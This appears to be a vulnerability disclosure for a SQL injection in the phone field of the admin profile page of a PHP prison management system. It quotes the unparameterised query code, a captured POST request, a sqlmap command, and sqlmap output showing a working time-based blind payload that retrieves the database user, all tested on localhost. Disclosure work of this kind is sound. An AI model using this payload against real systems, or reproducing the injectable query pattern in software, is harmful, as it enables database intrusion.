Prison Management System - SQL Injection on (/prison/Admin/edit_profile.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/prison/Admin/edit_profile.php
```

In this scenario, user input (txtphone) is directly  incorporated into an SQL query without any filtering or prepared  statements, making the application susceptible to SQL Injection attacks.

```
15: mysqli_query mysqli_query($conn, $sql))
14: $sql = " update users set fullname='$fullname',phone='$phone' where username='$username'"; 
11: $fullname = $_POST['txtfullname']; 
12: $phone = $_POST['txtphone']; 
32: $username = $_SESSION['admin-username'];  // topbar.php
requires:
8: if(isset($_POST['btnupdate']))
```

Proof of vulnerability:

Request:

```
POST /prison/Admin/edit_profile.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Admin/edit_profile.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

txtfullname=Caroline+Bassey&txtphone=0905656&old_image=uploadImage%2F1.jpg&btnupdate=
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
[10:34:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:34:29] [INFO] checking if the injection point on POST parameter 'txtphone' is a false positive
POST parameter 'txtphone' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 78 HTTP(s) requests:
---
Parameter: txtphone (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtfullname=Caroline Bassey&txtphone=0905656' AND (SELECT 8570 FROM (SELECT(SLEEP(5)))CBzP) AND 'WdvE'='WdvE&old_image=uploadImage/1.jpg&btnupdate=
---
[10:34:44] [INFO] the back-end DBMS is MySQL
[10:34:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[10:34:44] [INFO] fetching current user
[10:34:44] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[10:34:59] [INFO] adjusting time delay to 1 second due to good response times
root@localhost
current user: 'root@localhost'
```

